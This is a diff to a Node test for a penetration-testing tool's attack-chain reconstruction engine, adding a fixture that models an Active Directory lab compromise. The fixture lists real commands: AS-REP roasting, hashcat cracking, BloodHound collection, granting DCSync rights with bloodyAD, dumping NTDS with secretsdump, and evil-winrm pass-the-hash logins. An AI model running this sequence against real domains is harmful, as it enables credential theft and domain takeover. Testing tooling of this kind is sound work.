@@ -1,14 +1,14 @@
 /* Node sanity test for the compromise-chain reconstruction (engine/chain.js). */
 'use strict';
-require('../../assets/engine/facts.js');
-require('../../assets/engine/phases.js');
-require('../../assets/engine/pack.js');
-require('../../assets/engine/chain.js');
+require('../../../assets/engine/facts.js');
+require('../../../assets/engine/phases.js');
+require('../../../assets/engine/pack.js');
+require('../../../assets/engine/chain.js');
 const fs = require('fs'), path = require('path');
 const OBOL = globalThis.OBOL;
 const F = OBOL.facts;
 
-const PACKS = path.join(__dirname, '..', '..', 'data', 'packs');
+const PACKS = path.join(__dirname, '..', '..', '..', 'data', 'packs');
 const NAMES = ['recon_2026_09', 'ad_2026_09', 'credential_access_2026_09', 'cracking_2026_09', 'shells_2026_09', 'obol_flag_hunt_2026_09'];
 const actions = OBOL.pack.loadPacks(NAMES.map((n) => JSON.parse(fs.readFileSync(path.join(PACKS, n + '.json'), 'utf8'))));
 
@@ -63,6 +63,45 @@ ok(chain[chain.length - 1].technique === 'Root Flag Captured', 'the flag step is
 const bare = new F.FactSet([mk('target.configured', {}, 'engagement', 1), mk('credential.available', { user: 'x' }, 'manual', 2)]);
 const bareChain = OBOL.chain.build({ facts: bare, activities: [], actions: actions, host: host });
 ok(bareChain.length >= 1 && bareChain[0].kind === 'target.configured', 'degrades gracefully with no run ledger');
+
+// Forest-like AD chain: ad.attack_paths / ad.acl_lead remain visible when ad.control_paths is proven,
+// credential.plaintext <-> credential.available causal backlinks resolve, and co-produced access milestones dedup.
+const adFacts = new F.FactSet([
+  mk('target.configured', {}, 'engagement', 1),
+  mk('hash.asrep', { user: 'svc-alfresco' }, 'GetNPUsers', 10),
+  mk('credential.plaintext', { user: 'svc-alfresco' }, 'hashcat', 20),
+  mk('credential.available', { user: 'svc-alfresco' }, 'hashcat', 20),
+  mk('ad.attack_paths', {}, 'bloodhound-python', 30),
+  mk('ad.control_paths', { right: 'GenericAll', target: 'htb.local' }, 'bloodyAD', 40),
+  mk('loot.ntds', {}, 'secretsdump', 50),
+  mk('winrm.authenticated', {}, 'evil-winrm', 60),
+  mk('foothold.windows', { user: 'svc-alfresco' }, 'evil-winrm', 60),
+  mk('access.shell', {}, 'evil-winrm', 60),
+  mk('access.admin', { user: 'Administrator' }, 'evil-winrm', 70),
+  mk('objective.root_flag', { slot: 'root', flag: 'deadbeef' }, 'evil-winrm', 80),
+]);
+const adActs = [
+  { tool: 'GetNPUsers', command: 'impacket-GetNPUsers htb.local/ -no-pass', target: host, scope: 'host:' + host, at: 10, produced: ['hash.asrep'] },
+  { tool: 'hashcat', command: 'hashcat -m 18200 asrep.hashes rockyou.txt', target: host, scope: 'host:' + host, at: 20, produced: ['credential.plaintext', 'credential.available'] },
+  { tool: 'bloodhound-python', command: 'bloodhound-python -u svc-alfresco -p s3rvice -d htb.local -ns 10.10.10.5 -c All', target: host, scope: 'host:' + host, at: 30, produced: ['ad.attack_paths'] },
+  { tool: 'bloodyAD', command: 'bloodyAD -d htb.local --host 10.10.10.5 -u svc-alfresco -p s3rvice add dcsync svc-alfresco', target: host, scope: 'host:' + host, at: 40, produced: ['ad.control_paths'] },
+  { tool: 'secretsdump', command: 'impacket-secretsdump htb.local/svc-alfresco:s3rvice@10.10.10.5', target: host, scope: 'host:' + host, at: 50, produced: ['loot.ntds'] },
+  { tool: 'evil-winrm', command: 'evil-winrm -i 10.10.10.5 -u svc-alfresco -p s3rvice', target: host, scope: 'host:' + host, at: 60, produced: ['winrm.authenticated', 'foothold.windows', 'access.shell'] },
+  { tool: 'evil-winrm', command: 'evil-winrm -i 10.10.10.5 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6', target: host, scope: 'host:' + host, at: 70, produced: ['access.admin'] },
+  { tool: 'evil-winrm', command: 'type C:\\Users\\Administrator\\Desktop\\root.txt', target: host, scope: 'host:' + host, at: 80, produced: ['objective.root_flag'] },
+];
+const adChain = OBOL.chain.build({ facts: adFacts, activities: adActs, actions: actions, host: host });
+const adKinds = adChain.map((s) => s.kind);
+ok(adKinds.indexOf('ad.attack_paths') >= 0 && adKinds.indexOf('ad.control_paths') >= 0,
+  'AD chain keeps ad.attack_paths alongside ad.control_paths');
+const ptStep = adChain.find((s) => s.kind === 'credential.plaintext');
+ok(ptStep && ptStep.enabledBy.indexOf('hash.asrep') >= 0,
+  'credential.plaintext links back to hash.asrep via credential.available equivalence');
+const apStep = adChain.find((s) => s.kind === 'ad.attack_paths');
+ok(apStep && apStep.enabledBy.indexOf('credential.plaintext') >= 0,
+  'ad.attack_paths links back to credential.plaintext');
+ok(adKinds.indexOf('foothold.windows') >= 0 && adKinds.indexOf('access.shell') === -1,
+  'co-produced foothold.windows and access.shell from one command deduplicate to primary foothold');
 
 console.log(fail ? ('\nCHAIN SMOKE: ' + fail + ' FAILURES') : '\nCHAIN SMOKE: all passed');
 process.exit(fail ? 1 : 0);
